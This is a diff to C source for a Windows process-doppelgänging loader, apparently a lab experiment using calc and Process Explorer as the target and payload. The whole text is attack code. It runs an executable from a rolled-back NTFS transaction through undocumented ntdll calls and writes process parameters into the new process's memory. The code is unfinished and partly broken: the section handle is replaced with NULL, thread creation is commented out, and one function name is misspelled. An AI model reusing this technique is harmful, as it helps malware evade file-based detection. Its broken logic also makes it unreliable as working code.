@@ -58,8 +58,8 @@ LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
 
 int main(void)
 {
-	LPWSTR targetProcess = "C:\\Users\\wvbox\\Desktop\\calc_64.exe";
-	LPWSTR payload = "C:\\Users\\wvbox\\Desktop\\procexp64.exe";
+	LPWSTR targetProcess = L"C:\\Users\\wvbox\\Desktop\\calc_64.exe";
+	LPWSTR payload = L"C:\\Users\\wvbox\\Desktop\\procexp64.exe";
 	HMODULE hNtdll;
 	HANDLE hTransaction;
 	HANDLE hTransactedFile;
@@ -67,6 +67,7 @@ int main(void)
 	HANDLE hProcess;
 	HANDLE hThread;
 	LPVOID lpPayloadBuffer;
+	LPVOID remoteProcParams;
 	DWORD payloadSize;
 	DWORD bytesWritten;
 
@@ -74,6 +75,16 @@ int main(void)
 	NT_CREATE_SECTION _ntCreateSection;
 	NT_CREATE_PROCESS_EX _ntCreateProcessEx;
 	NT_CREATE_THREAD_EX _ntCreateThreadEx;
+	
+	RTL_CREATE_PROCESS_PARAMETERS _rtlCreateProcessParameters;
+	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
+	
+	RTL_INIT_UNICODE_STRING _rtlInitUnicodeString;
+	UNICODE_STRING ustr;
+	
+	NT_QUERY_INFORMATION_PROCESS _ntQueryInformationProcess;
+	PROCESS_BASIC_INFORMATION pbi;
+
 
 	hNtdll = GetModuleHandle("ntdll.dll");
 
@@ -108,6 +119,7 @@ int main(void)
 
 	// Create the section in the target process.
 	_ntCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtdll, "NtCreateSection");
+	printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
 	status = 0;
 	if (_ntCreateSection)
 	{
@@ -123,6 +135,7 @@ int main(void)
 	}
 	if (STATUS_SUCCESS != status)
 		fatal_error("NtCreateSection() failed.");
+	
 
 	// Rollback the transaction to remove our changes from the file system.
 	if (!RollbackTransaction(hTransaction))
@@ -130,6 +143,7 @@ int main(void)
 
 	// Create a new process to wrap the previously created section.
 	_ntCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtdll, "NtCreateProcessEx");
+	printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
 	status = 0;
 	if (_ntCreateProcessEx)
 	{
@@ -139,7 +153,7 @@ int main(void)
 			NULL,
 			GetCurrentProcess(),
 			PS_INHERIT_HANDLES,
-			hSection,
+			NULL,//hSection,
 			NULL,
 			NULL,
 			FALSE
@@ -148,8 +162,76 @@ int main(void)
 	if (STATUS_SUCCESS != status)
 		fatal_error("NtCreateProcessEx() failed.");
 
+	// Create the parameters for that process.
+	_rtlCreateProcessParameters = (RTL_CREATE_PROCESS_PARAMETERS)GetProcAddress(hNtdll, "RtlCreateProcessParameters");
+	_rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(hNtdll, "RtlInitUnicodeString");
+	printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParameters);
+	printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);
+
+	_rtlInitUnicodeString(&ustr, targetProcess);
+	status = 0;
+	if (_rtlCreateProcessParameters)
+	{
+		status = _rtlCreateProcessParameters(
+			&processParameters,
+			&ustr,
+			NULL,
+			NULL,
+			&ustr,
+			NULL,
+			NULL,
+			NULL,
+			NULL,
+			NULL,
+			RTL_USER_PROC_PARAMS_NORMALIZED
+		);
+	}
+	if (STATUS_SUCCESS != status)
+		fatal_error("RtlCreateProcessParameters() failed.");
+
+	printf("Params length : %d\n", processParameters->Length);
+
+	// Allocate enough memory in the remote process' address space to write the 
+	// process parameters struct into it.
+	remoteProcParams = VirtualAllocEx(
+		hProcess,
+		(LPVOID)processParameters,
+		processParameters->Length,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_READWRITE
+	);
+	if (!remoteProcParams)
+		fatal_error("VirtualAllocEx() failed.");
+
+	// Write the parameters to the remote process.
+	if ( !WriteProcessMemory(
+		hProcess,
+		remoteProcParams,
+		processParameters,
+		processParameters->Length,
+		NULL
+	))
+		fatal_error("WriteProcessMemory() failed.");
+	
+	// Get remote process' PEB address.
+	_ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)GetProcAddress(hNtdll, "NtQueryinformationProcess");
+	if (_ntQueryInformationProcess)
+	{
+		status = _ntQueryInformationProcess(
+			hProcess,
+			ProcessBasicInformation,
+			&pbi, //TODO : Create a PEB struct
+			sizeof(PROCESS_BASIC_INFORMATION),
+			NULL
+		);
+	}
+
+	//WriteProcessMemory(RemotePEB.ProcessParameters);
+
 	// Create the main thread for the new process.
 	_ntCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtdll, "NtCreateThreadEx");
+	printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
+	/*
 	status = 0;
 	if (_ntCreateThreadEx)
 	{
@@ -158,7 +240,7 @@ int main(void)
 			THREAD_ALL_ACCESS,
 			NULL,
 			hProcess,
-			// TODO : understand the process/thread parameter setup,
+			// TODO : get remote process entry point,
 			NULL,
 			FALSE,
 			0,
@@ -169,16 +251,11 @@ int main(void)
 	}
 	if (STATUS_SUCCESS != status)
 		fatal_error("NtCreateThreadEx() failed.");
-
-	/*
-	RtlCreateProcessParameters();
-
-	VirtualAllocEx();
-	WriteProcessMemory(RemoteProcessParams);
-	WriteProcessMemory(RemotePEB.ProcessParameters);
-
-	NtResumeThread();
 	*/
+
+	//NtResumeThread();
+
+	getchar();
 
 	return 0;
 }
